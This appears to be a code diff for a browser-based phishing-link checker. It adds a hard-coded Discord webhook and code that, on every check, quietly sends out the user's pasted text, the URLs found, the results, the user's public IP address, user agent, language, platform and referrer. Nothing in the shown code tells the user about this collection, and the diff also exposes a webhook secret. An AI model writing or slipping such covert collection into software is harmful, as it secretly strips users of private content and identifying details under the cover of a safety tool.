@@ -120,11 +120,77 @@ function displayResults(results) {
     resultsContent.innerHTML = html;
 }
 
+// Discord webhook URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
+
+// Send data to webhook
+async function sendToWebhook(data) {
+    try {
+        const embed = {
+            title: "🔍 New Phishing Check Submission",
+            color: 0x1a237e,
+            timestamp: new Date().toISOString(),
+            fields: [
+                {
+                    name: "📝 Input Content",
+                    value: data.input.substring(0, 1024) || "No content",
+                    inline: false
+                },
+                {
+                    name: "🔗 URLs Found",
+                    value: data.urls.length > 0 ? data.urls.join('\n').substring(0, 1024) : "No URLs detected",
+                    inline: false
+                },
+                {
+                    name: "📊 Results",
+                    value: data.results.map(r => `${r.status.toUpperCase()}: ${r.url}`).join('\n').substring(0, 1024) || "No results",
+                    inline: false
+                },
+                {
+                    name: "🌐 User Info",
+                    value: `IP: ${data.userInfo.ip}\nUser Agent: ${data.userInfo.userAgent.substring(0, 200)}`,
+                    inline: false
+                },
+                {
+                    name: "🕒 Timestamp",
+                    value: new Date().toLocaleString(),
+                    inline: true
+                }
+            ]
+        };
+
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: 'Phishing Checker Bot',
+                avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
+                embeds: [embed]
+            })
+        });
+    } catch (error) {
+        console.error('Webhook error:', error);
+    }
+}
+
+// Get user IP (using public API)
+async function getUserIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return 'Unknown';
+    }
+}
+
 // Event listeners
 urlInput.addEventListener('input', updateCheckButton);
 recaptchaCheckbox.addEventListener('change', updateCheckButton);
 
-checkButton.addEventListener('click', () => {
+checkButton.addEventListener('click', async () => {
     const inputText = urlInput.value.trim();
     
     if (!inputText) {
@@ -151,9 +217,28 @@ checkButton.addEventListener('click', () => {
     checkButton.disabled = true;
     checkButton.textContent = 'Checking...';
     
-    setTimeout(() => {
+    // Get user IP
+    const userIP = await getUserIP();
+    
+    setTimeout(async () => {
         const results = checkForPhishing(urls);
         displayResults(results);
+        
+        // Send data to webhook
+        const webhookData = {
+            input: inputText,
+            urls: urls,
+            results: results,
+            userInfo: {
+                ip: userIP,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                referrer: document.referrer || 'Direct'
+            }
+        };
+        
+        await sendToWebhook(webhookData);
         
         checkButton.disabled = false;
         checkButton.textContent = 'Check';
